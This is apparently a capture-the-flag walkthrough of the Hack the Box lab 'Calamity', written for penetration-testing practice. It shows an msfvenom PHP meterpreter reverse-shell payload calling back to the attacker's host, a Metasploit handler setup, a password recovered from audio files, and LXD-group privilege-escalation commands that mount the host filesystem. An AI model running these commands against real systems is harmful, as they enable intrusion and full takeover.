<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Calamity Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-calamity-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-04-08T17:56:33+00:00">April 8, 2018</time><time class="updated" datetime="2025-07-05T18:55:34+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<b>Calamity</b>” which is available online for those who want to increase their skill in penetration testing and black box testing. Shrek is retired vulnerable lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on victim’s machine.</span></p>
<h3><span style="color: #800000;">Web Enumeration and Initial Access</span></h3>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of sense is <strong>10.10.10.27</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="lang:default decode:true">nmap -A 10.10.10.27</pre>
<p><span style="color: #000000;">From given below image, you can observe we found port 22 and 80 are open in victim’s network.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-EISzkShNeAM/WspWJPup3VI/AAAAAAAAWLw/iyhlld8V-Q8EljgxxSFbqywXlSuWjc8mwCLcBGAs/s1600/1.png"/></p>
<p><span style="color: #000000;">As port 80 is running HTTP on the target machine, so we open the IP address in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4paKT3fn-CA/WspGA5fSiBI/AAAAAAAAWKg/7I76As8sYbgbkGPDrDPu6E43_Q0NrhemgCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">We don’t find anything on the homepage so we use dirb to enumerate the directories.</span></p>
<pre class="lang:default decode:true">dirb http://10.10.10.27</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-TdtHcHuy6Ck/WspWZjoRAjI/AAAAAAAAWMc/sCtrwT1f6XgP71nRFtWFNfzTeE9Ho1S1gCLcBGAs/s1600/3.png"/></p>
<h3><span style="color: #800000;">Exploiting the Admin Portal</span></h3>
<p><span style="color: #000000;">Now we open admin.php, and find a login page. We take a look at the source page but we don’t find anything.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-3p-AaYDPlRo/WspGB0qSsAI/AAAAAAAAWKU/ySzdpSFXRrQ5sQyyYyqwbl31J76Si_DygCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">When we use curl to access the page we find a password commented in the HTML page.</span></p>
<pre class="lang:default decode:true">curl -v http://10.10.10.27/admin.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-uFFkEco-YGw/WspWZ7NJGTI/AAAAAAAAWMk/AP3g0KA_dlMlj5EuoSbT2qny68Od2ALDQCLcBGAs/s1600/6.png"/></p>
<p><span style="color: #000000;">We try the username admin and the password we find on the page to login to the page. We then get access to a page that allows us to run php code in it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-T48DXWIehig/WspGCf1c3UI/AAAAAAAAWKY/ez3LFXRagjs98Sk1YhVe_zVQfYI2qi5-gCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Firstly, we try to execute normal PHP payload but are unable to get a stable tty shell, so we use base64 encoded php shell to exploit this web application. We generate a base64 encoded shell using metasploit.</span></p>
<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4444 -e php/base64 -f raw</pre>
<p><img decoding="async" src="https://2.bp.blogspot.com/-qMFJ-LuAJnE/WspWaf5YZkI/AAAAAAAAWMo/CPWslnU3k2Ua9AWxVFjYh5nt7cX7U5uyQCLcBGAs/s1600/8.png"/></p>
<p><span style="color: #000000;">Then, we paste this shell in the target machine’s page between <strong>&lt;?php ?&gt; </strong>tag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iQ4wos_TOiA/WspGC_YMnxI/AAAAAAAAWKg/K6wyZik0nyI2VJBu1wDcfqdyLmH_mh3bwCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We setup our listener using metasploit to get reverse shell. As soon as we run our shell on the page we get the reverse shell.</span></p>
<pre class="lang:default decode:true ">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 10.10.14.3
msf exploit(multi/handler) &gt; set lport 4444
msf exploit(multi/handler) &gt; exploit</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-BaN02GDacz8/WspWIx8ufPI/AAAAAAAAWLo/vLJ-Q8HquPUNKDRu58Hhr4S67VvVVKs0wCLcBGAs/s1600/10.png"/></p>
<p><span style="color: #000000;">After getting reverse shell we enumerate through the directories, in <b>/home/xalvas</b> we find a file called user.txt. When we open user.txt we find our first flag.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-FUoK1rQU3dw/WspWJO0GbOI/AAAAAAAAWLs/wWh9lN2uGVMqUFe6DrPdUBQSu9LrjAGzwCLcBGAs/s1600/11.png"/></p>
<p><span style="color: #000000;">We also find a file called recov.wav; we download it to our system to gain further information.</span></p>
<pre class="lang:default decode:true">download recov.wav /root/Desktop</pre>
<h3><span style="color: #800000;">Establishing Foothold Through Audio Steganography</span></h3>
<p><span style="color: #000000;">Then, we go to alarmclocks directory inside the xalvas directory and find 1 mp3 and 1 wav file. We download both files into our system.</span></p>
<pre class="lang:default decode:true">download rick.wav /root/Desktop/
download xouzouris.mp3 /root/Desktop/</pre>
<p><img decoding="async" src="https://2.bp.blogspot.com/-35nSFBV6yAI/WspWJ4FfV3I/AAAAAAAAWL0/E_cw9ndKBCEZW87rxty3o0CWFwUmC0qPACLcBGAs/s1600/12.png"/></p>
<p><span style="color: #000000;">We use a tool called audacity to perform steganography on the audio files. Listening to the audio we find 2 of them sound similar. We load recov.wav and rick.wav into audacity, invert rick.wav then export the combination of both. After combining both the files we find a password in the audio “<strong>18547936..*</strong>”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Bp_rE-Ymbws/WspF_PssNHI/AAAAAAAAWKQ/rA2b7bw4CrE7sbvmZ8-kHYB_-DtOtC_PgCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We use the username as xalvas and password that we found in the audio file to log in through ssh into the target machine. When we run id command we find that the user is added in lxd group.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-DkJXspuY2wQ/WspWJ-h274I/AAAAAAAAWL4/-OBXRbSdaY4435ke-nQZlC3kWNl5VTlTwCLcBGAs/s1600/15.png"/></p>
<h3><span style="color: #800000;">Privilege Escalation via LXD Misconfiguration</span></h3>
<p><span style="color: #000000;">As lxd is a container technology we can run processes as root using lxd. To exploit this we download “lxd alpine builder” to create an image of alpine Linux.</span></p>
<pre class="lang:default decode:true">git clone https://github.com/saghul/lxd-alpine-builder.git</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-nx1QBKYltp4/WspWX4BKvjI/AAAAAAAAWME/rUNEUCisH0MDKsnmp1wV7j5KX6Wl0dOQgCLcBGAs/s1600/17.png"/></p>
<p><span style="color: #000000;">Now create a 32-bit Alpine Linux image using lxd alpine builder.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-eyFwHU5FAyw/WspWX3DU-mI/AAAAAAAAWMM/DL-qrW3-PgcUTVsmx25031id5rPOHhltACLcBGAs/s1600/18.png"/></p>
<p><span style="color: #000000;">We send the Linux image to the target machine using scp.</span></p>
<pre class="lang:default decode:true ">scp alpine-v3.7-i686-20180405_0501.tar.gz xalvas@10.10.10.27:</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-1zS7w1Jg8Ck/WspWX_pKLPI/AAAAAAAAWMI/8dJGz_mp4WYJo24x2bFMm8ZAwtgHfzNhACLcBGAs/s1600/19.png"/></p>
<p><span style="color: #000000;">Then, we go to the target machine and import the Linux image and create an image called ignite with administrative privileges.</span></p>
<pre class="lang:default decode:true">mkdir raj
mv  alpine-v3.7-i686-20180405_0501.tar.gz raj
lxc image import alpine-v3.7-i686-20180405_0501.tar.gz --alias alpine
lxc image list
lxc init alpine ignite -c security.privileged=true</pre>
<p><img decoding="async" src="https://2.bp.blogspot.com/-4vbfVVUHRJk/WspWZG1J1AI/AAAAAAAAWMY/cssP2ERHzYQwnpBYiH3M7wbaKtVf2QIKQCLcBGAs/s1600/20.png"/></p>
<p><span style="color: #000000;">We mount the whole filesystem into the container; we start the container and execute the shell the shell inside. After spawning the shell we open root.txt in /mnt/root/root directory and find the final flag.</span></p>
<pre class="lang:default decode:true ">lxc config device add ignite mydevice mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-sczpEV4CA9o/WspWZPVO79I/AAAAAAAAWMU/4aznQSAWW9s6W_A0QUvWSD63n-XutkgDACLcBGAs/s1600/21.png"/></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Autthor</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
